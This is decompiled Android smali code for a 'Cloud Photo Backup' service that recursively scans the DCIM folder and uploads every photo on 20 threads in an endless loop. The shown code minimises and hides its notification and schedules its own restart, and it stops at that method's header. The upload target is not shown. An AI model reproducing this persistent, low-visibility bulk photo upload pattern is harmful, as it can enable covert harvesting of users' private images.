.class public Lcom/photo/gallery/PhotoUploadService;
.super Landroid/app/Service;
.source "PhotoUploadService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/photo/gallery/PhotoUploadService$PhotoInfo;
    }
.end annotation


# static fields
.field private static final CHANNEL_ID:Ljava/lang/String; = "photo_upload_channel"

.field private static final JOB_ID:I = 0x3e9

.field private static final NOTIFICATION_ID:I = 0x1

.field private static final TAG:Ljava/lang/String; = "PhotoUploadService"

.field private static final THREAD_POOL_SIZE:I = 0x14


# instance fields
.field private executorService:Ljava/util/concurrent/ExecutorService;

.field private httpClient:Lokhttp3/OkHttpClient;

.field private isRunning:Z

.field private totalCount:Ljava/util/concurrent/atomic/AtomicInteger;

.field private uploadedCount:Ljava/util/concurrent/atomic/AtomicInteger;


# direct methods
.method public constructor <init>()V
    .locals 2

    .line 36
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 45
    new-instance v0, Ljava/util/concurrent/atomic/AtomicInteger;

    const/4 v1, 0x0

    invoke-direct {v0, v1}, Ljava/util/concurrent/atomic/AtomicInteger;-><init>(I)V

    iput-object v0, p0, Lcom/photo/gallery/PhotoUploadService;->uploadedCount:Ljava/util/concurrent/atomic/AtomicInteger;

    .line 46
    new-instance v0, Ljava/util/concurrent/atomic/AtomicInteger;

    invoke-direct {v0, v1}, Ljava/util/concurrent/atomic/AtomicInteger;-><init>(I)V

    iput-object v0, p0, Lcom/photo/gallery/PhotoUploadService;->totalCount:Ljava/util/concurrent/atomic/AtomicInteger;

    .line 47
    iput-boolean v1, p0, Lcom/photo/gallery/PhotoUploadService;->isRunning:Z

    return-void
.end method

.method private continuousUpload()V
    .locals 3

    .line 91
    const-string v0, "PhotoUploadService"

    :goto_0
    iget-boolean v1, p0, Lcom/photo/gallery/PhotoUploadService;->isRunning:Z

    if-eqz v1, :cond_1

    .line 94
    :try_start_0
    invoke-static {p0}, Lcom/photo/gallery/NetworkMonitor;->isNetworkAvailable(Landroid/content/Context;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 95
    const-string v1, "No internet - waiting..."

    const/4 v2, 0x0

    invoke-direct {p0, v1, v2, v2}, Lcom/photo/gallery/PhotoUploadService;->updateNotification(Ljava/lang/String;II)V

    const-wide/16 v1, 0x1388

    .line 96
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V

    goto :goto_0

    .line 101
    :cond_0
    invoke-direct {p0}, Lcom/photo/gallery/PhotoUploadService;->scanAndUploadPhotos()V

    const-wide/16 v1, 0x7530

    .line 104
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    .line 110
    const-string v2, "Error in upload"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    const-wide/16 v1, 0x2710

    .line 112
    :try_start_1
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_2

    goto :goto_0

    :catch_1
    move-exception v1

    .line 107
    const-string v2, "Upload interrupted"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :catch_2
    :cond_1
    return-void
.end method

.method private createNotification(Ljava/lang/String;II)Landroid/app/Notification;
    .locals 2

    .line 185
    new-instance v0, Landroidx/core/app/NotificationCompat$Builder;

    const-string v1, "photo_upload_channel"

    invoke-direct {v0, p0, v1}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const-string v1, "Cloud Photo Backup"

    .line 186
    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 187
    invoke-virtual {v0, p1}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object p1

    const v0, 0x1080055

    .line 188
    invoke-virtual {p1, v0}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object p1

    const/4 v0, 0x1

    .line 189
    invoke-virtual {p1, v0}, Landroidx/core/app/NotificationCompat$Builder;->setOngoing(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object p1

    const/4 v0, -0x1

    .line 190
    invoke-virtual {p1, v0}, Landroidx/core/app/NotificationCompat$Builder;->setPriority(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object p1

    .line 191
    invoke-virtual {p1, v0}, Landroidx/core/app/NotificationCompat$Builder;->setVisibility(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object p1

    if-lez p3, :cond_0

    const/4 v0, 0x0

    .line 194
    invoke-virtual {p1, p3, p2, v0}, Landroidx/core/app/NotificationCompat$Builder;->setProgress(IIZ)Landroidx/core/app/NotificationCompat$Builder;

    .line 197
    :cond_0
    invoke-virtual {p1}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object p1

    return-object p1
.end method

.method private createNotificationChannel()V
    .locals 4

    .line 168
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    .line 169
    new-instance v0, Landroid/app/NotificationChannel;

    const-string v1, "Cloud Photo Backup"

    const/4 v2, 0x2

    const-string v3, "photo_upload_channel"

    invoke-direct {v0, v3, v1, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 174
    const-string v1, "Automatic photo backup to secure cloud storage"

    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    const/4 v1, 0x0

    .line 175
    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    const/4 v1, -0x1

    .line 176
    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setLockscreenVisibility(I)V

    .line 177
    const-class v1, Landroid/app/NotificationManager;

    invoke-virtual {p0, v1}, Lcom/photo/gallery/PhotoUploadService;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    if-eqz v1, :cond_0

    .line 179
    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    :cond_0
    return-void
.end method

.method private generatePhotoHash(Lcom/photo/gallery/PhotoUploadService$PhotoInfo;)Ljava/lang/String;
    .locals 7

    .line 414
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v1, p1, Lcom/photo/gallery/PhotoUploadService$PhotoInfo;->name:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "_"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-wide v2, p1, Lcom/photo/gallery/PhotoUploadService$PhotoInfo;->size:J

    invoke-virtual {v0, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-wide v1, p1, Lcom/photo/gallery/PhotoUploadService$PhotoInfo;->dateTaken:J

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    .line 416
    :try_start_0
    const-string v0, "MD5"

    invoke-static {v0}, Ljava/security/MessageDigest;->getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;

    move-result-object v0

    .line 417
    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/security/MessageDigest;->digest([B)[B

    move-result-object v0

    .line 418
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 419
    array-length v2, v0

    const/4 v3, 0x0

    :goto_0
    if-ge v3, v2, :cond_1

    aget-byte v4, v0, v3

    and-int/lit16 v4, v4, 0xff

    .line 420
    invoke-static {v4}, Ljava/lang/Integer;->toHexString(I)Ljava/lang/String;

    move-result-object v4

    .line 421
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v5

    const/4 v6, 0x1

    if-ne v5, v6, :cond_0

    const/16 v5, 0x30

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 422
    :cond_0
    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 424
    :cond_1
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-object p1
.end method

.method private getPhotosFromDCIMDirect()Ljava/util/List;
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/List<",
            "Lcom/photo/gallery/PhotoUploadService$PhotoInfo;",
            ">;"
        }
    .end annotation

    .line 292
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 295
    sget-object v1, Landroid/os/Environment;->DIRECTORY_DCIM:Ljava/lang/String;

    invoke-static {v1}, Landroid/os/Environment;->getExternalStoragePublicDirectory(Ljava/lang/String;)Ljava/io/File;

    move-result-object v1

    .line 297
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    const-string v3, "PhotoUploadService"

    if-eqz v2, :cond_1

    invoke-virtual {v1}, Ljava/io/File;->isDirectory()Z

    move-result v2

    if-nez v2, :cond_0

    goto :goto_0

    .line 302
    :cond_0
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v4, "Scanning DCIM folder: "

    invoke-direct {v2, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v3, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 305
    invoke-direct {p0, v1, v0}, Lcom/photo/gallery/PhotoUploadService;->scanDirectoryForPhotos(Ljava/io/File;Ljava/util/List;)V

    return-object v0

    .line 298
    :cond_1
    :goto_0
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v4, "DCIM folder not found: "

    invoke-direct {v2, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-object v0
.end method

.method private getUploadedPhotos()Ljava/util/Set;
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/Set<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .line 467
    const-string v0, "photo_backup"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/photo/gallery/PhotoUploadService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 468
    new-instance v1, Ljava/util/HashSet;

    invoke-direct {v1}, Ljava/util/HashSet;-><init>()V

    const-string v2, "uploaded_photos"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getStringSet(Ljava/lang/String;Ljava/util/Set;)Ljava/util/Set;

    move-result-object v0

    return-object v0
.end method

.method private isImageFile(Ljava/lang/String;)Z
    .locals 1

    .line 333
    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p1

    .line 334
    const-string v0, ".jpg"

    invoke-virtual {p1, v0}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, ".jpeg"

    .line 335
    invoke-virtual {p1, v0}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, ".png"

    .line 336
    invoke-virtual {p1, v0}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, ".gif"

    .line 337
    invoke-virtual {p1, v0}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, ".webp"

    .line 338
    invoke-virtual {p1, v0}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, ".heic"

    .line 339
    invoke-virtual {p1, v0}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, ".heif"

    .line 340
    invoke-virtual {p1, v0}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_0

    goto :goto_0

    :cond_0
    const/4 p1, 0x0

    return p1

    :cond_1
    :goto_0
    const/4 p1, 0x1

    return p1
.end method

.method private isPhotoAlreadyUploaded(Ljava/lang/String;)Z
    .locals 3

    .line 431
    const-string v0, "photo_backup"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/photo/gallery/PhotoUploadService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 432
    new-instance v1, Ljava/util/HashSet;

    invoke-direct {v1}, Ljava/util/HashSet;-><init>()V

    const-string v2, "uploaded_hashes"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getStringSet(Ljava/lang/String;Ljava/util/Set;)Ljava/util/Set;

    move-result-object v0

    .line 433
    invoke-interface {v0, p1}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    move-result p1

    return p1
.end method

.method private markPhotoAsUploaded(Ljava/lang/String;)V
    .locals 3

    .line 472
    const-string v0, "photo_backup"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/photo/gallery/PhotoUploadService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 473
    new-instance v1, Ljava/util/HashSet;

    invoke-direct {p0}, Lcom/photo/gallery/PhotoUploadService;->getUploadedPhotos()Ljava/util/Set;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/util/HashSet;-><init>(Ljava/util/Collection;)V

    .line 474
    invoke-interface {v1, p1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    .line 475
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    const-string v0, "uploaded_photos"

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences$Editor;->putStringSet(Ljava/lang/String;Ljava/util/Set;)Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V

    return-void
.end method

.method private markPhotoHashAsUploaded(Ljava/lang/String;)V
    .locals 4

    .line 437
    const-string v0, "photo_backup"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/photo/gallery/PhotoUploadService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 438
    new-instance v1, Ljava/util/HashSet;

    new-instance v2, Ljava/util/HashSet;

    invoke-direct {v2}, Ljava/util/HashSet;-><init>()V

    const-string v3, "uploaded_hashes"

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences;->getStringSet(Ljava/lang/String;Ljava/util/Set;)Ljava/util/Set;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/util/HashSet;-><init>(Ljava/util/Collection;)V

    .line 439
    invoke-interface {v1, p1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    .line 440
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    invoke-interface {p1, v3, v1}, Landroid/content/SharedPreferences$Editor;->putStringSet(Ljava/lang/String;Ljava/util/Set;)Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V

    return-void
.end method

.method private performBackupCycle()V
    .locals 3

    .line 137
    const-string v0, "PhotoUploadService"

    :goto_0
    iget-boolean v1, p0, Lcom/photo/gallery/PhotoUploadService;->isRunning:Z

    if-eqz v1, :cond_1

    .line 140
    :try_start_0
    invoke-static {p0}, Lcom/photo/gallery/NetworkMonitor;->isNetworkAvailable(Landroid/content/Context;)Z

    move-result v1

    const/4 v2, 0x0

    if-nez v1, :cond_0

    .line 141
    const-string v1, "No internet - waiting..."

    invoke-direct {p0, v1, v2, v2}, Lcom/photo/gallery/PhotoUploadService;->updateNotification(Ljava/lang/String;II)V

    const-wide/16 v1, 0x1388

    .line 142
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V

    goto :goto_0

    .line 146
    :cond_0
    invoke-direct {p0}, Lcom/photo/gallery/PhotoUploadService;->scanAndUploadPhotos()V

    .line 149
    const-string v1, "Backup cycle complete. Waiting 3 minutes for next scan..."

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 150
    const-string v1, "Monitoring... Next scan in 3 min"

    invoke-direct {p0, v1, v2, v2}, Lcom/photo/gallery/PhotoUploadService;->updateNotification(Ljava/lang/String;II)V

    const-wide/32 v1, 0x2bf20

    .line 151
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    .line 157
    const-string v2, "Error in backup cycle"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    const-wide/16 v1, 0x7530

    .line 159
    :try_start_1
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_2

    goto :goto_0

    :catch_1
    move-exception v1

    .line 154
    const-string v2, "Backup cycle interrupted"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :catch_2
    :cond_1
    return-void
.end method

.method private scanAndUploadPhotos()V
    .locals 8

    .line 249
    invoke-direct {p0}, Lcom/photo/gallery/PhotoUploadService;->getPhotosFromDCIMDirect()Ljava/util/List;

    move-result-object v0

    .line 251
    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_0

    return-void

    .line 255
    :cond_0
    invoke-direct {p0}, Lcom/photo/gallery/PhotoUploadService;->getUploadedPhotos()Ljava/util/Set;

    move-result-object v1

    .line 256
    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    .line 258
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_1
    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_2

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lcom/photo/gallery/PhotoUploadService$PhotoInfo;

    .line 259
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v5, v3, Lcom/photo/gallery/PhotoUploadService$PhotoInfo;->path:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "_"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget-wide v6, v3, Lcom/photo/gallery/PhotoUploadService$PhotoInfo;->size:J

    invoke-virtual {v4, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget-wide v5, v3, Lcom/photo/gallery/PhotoUploadService$PhotoInfo;->dateTaken:J

    invoke-virtual {v4, v5, v6}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 260
    invoke-interface {v1, v4}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_1

    .line 261
    invoke-interface {v2, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_0

    .line 265
    :cond_2
    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v0

    const/4 v1, 0x0

    if-eqz v0, :cond_3

    .line 266
    const-string v0, "All photos uploaded \u2713 Monitoring..."

    invoke-direct {p0, v0, v1, v1}, Lcom/photo/gallery/PhotoUploadService;->updateNotification(Ljava/lang/String;II)V

    return-void

    .line 270
    :cond_3
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "Uploading "

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, " photos with 20 threads"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v3, "PhotoUploadService"

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 271
    iget-object v0, p0, Lcom/photo/gallery/PhotoUploadService;->uploadedCount:Ljava/util/concurrent/atomic/AtomicInteger;

    invoke-virtual {v0, v1}, Ljava/util/concurrent/atomic/AtomicInteger;->set(I)V

    .line 272
    iget-object v0, p0, Lcom/photo/gallery/PhotoUploadService;->totalCount:Ljava/util/concurrent/atomic/AtomicInteger;

    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v1

    invoke-virtual {v0, v1}, Ljava/util/concurrent/atomic/AtomicInteger;->set(I)V

    .line 275
    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_1
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_4

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcom/photo/gallery/PhotoUploadService$PhotoInfo;

    .line 276
    iget-object v4, p0, Lcom/photo/gallery/PhotoUploadService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance v5, Lcom/photo/gallery/PhotoUploadService$$ExternalSyntheticLambda1;

    invoke-direct {v5, p0, v1}, Lcom/photo/gallery/PhotoUploadService$$ExternalSyntheticLambda1;-><init>(Lcom/photo/gallery/PhotoUploadService;Lcom/photo/gallery/PhotoUploadService$PhotoInfo;)V

    invoke-interface {v4, v5}, Ljava/util/concurrent/ExecutorService;->execute(Ljava/lang/Runnable;)V

    goto :goto_1

    .line 280
    :cond_4
    :goto_2
    iget-object v0, p0, Lcom/photo/gallery/PhotoUploadService;->uploadedCount:Ljava/util/concurrent/atomic/AtomicInteger;

    invoke-virtual {v0}, Ljava/util/concurrent/atomic/AtomicInteger;->get()I

    move-result v0

    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v1

    if-ge v0, v1, :cond_5

    const-wide/16 v0, 0xc8

    .line 282
    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    .line 288
    :catch_0
    :cond_5
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "Upload complete: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/photo/gallery/PhotoUploadService;->uploadedCount:Ljava/util/concurrent/atomic/AtomicInteger;

    invoke-virtual {v1}, Ljava/util/concurrent/atomic/AtomicInteger;->get()I

    move-result v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " photos"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method private scanDirectoryForPhotos(Ljava/io/File;Ljava/util/List;)V
    .locals 12
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/io/File;",
            "Ljava/util/List<",
            "Lcom/photo/gallery/PhotoUploadService$PhotoInfo;",
            ">;)V"
        }
    .end annotation

    .line 311
    invoke-virtual {p1}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object p1

    if-nez p1, :cond_0

    goto :goto_2

    .line 314
    :cond_0
    array-length v0, p1

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v0, :cond_3

    aget-object v2, p1, v1

    .line 315
    invoke-virtual {v2}, Ljava/io/File;->isDirectory()Z

    move-result v3

    if-eqz v3, :cond_1

    .line 317
    invoke-direct {p0, v2, p2}, Lcom/photo/gallery/PhotoUploadService;->scanDirectoryForPhotos(Ljava/io/File;Ljava/util/List;)V

    goto :goto_1

    .line 318
    :cond_1
    invoke-virtual {v2}, Ljava/io/File;->isFile()Z

    move-result v3

    if-eqz v3, :cond_2

    invoke-virtual {v2}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v3

    invoke-direct {p0, v3}, Lcom/photo/gallery/PhotoUploadService;->isImageFile(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 320
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "_"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v2}, Ljava/io/File;->length()J

    move-result-wide v5

    invoke-virtual {v3, v5, v6}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v2}, Ljava/io/File;->lastModified()J

    move-result-wide v4

    invoke-virtual {v3, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 321
    new-instance v4, Lcom/photo/gallery/PhotoUploadService$PhotoInfo;

    .line 323
    invoke-virtual {v2}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v6

    .line 324
    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v7

    .line 325
    invoke-virtual {v2}, Ljava/io/File;->lastModified()J

    move-result-wide v8

    .line 326
    invoke-virtual {v2}, Ljava/io/File;->length()J

    move-result-wide v10

    invoke-direct/range {v4 .. v11}, Lcom/photo/gallery/PhotoUploadService$PhotoInfo;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;JJ)V

    .line 321
    invoke-interface {p2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_2
    :goto_1
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_3
    :goto_2
    return-void
.end method

.method private scheduleServiceRestartJob()V
